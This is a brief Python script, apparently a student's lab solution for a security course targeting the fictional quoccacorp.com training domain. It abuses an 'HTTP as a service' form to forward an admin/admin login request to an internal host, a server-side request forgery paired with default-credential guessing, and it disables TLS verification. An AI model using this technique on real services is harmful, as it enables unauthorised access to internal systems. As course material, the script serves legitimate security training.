# haas2_v2.py - F09A, wk 2

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning


kb_req = """POST /login HTTP/1.1
Host: kb.quoccacorp.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://haas.quoccacorp.com/
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Origin: http://haas.quoccacorp.com
Connection: keep-alive

user=admin&password=admin
"""

response = requests.post(
    "https://haas-v2.quoccacorp.com/",
    proxies={"https": "127.0.0.1:8080"},
    verify=False,
    data={"requestBox": kb_req},
)

# print(response.headers)
# print()
# print(response.content)
# print()
print(response.text)
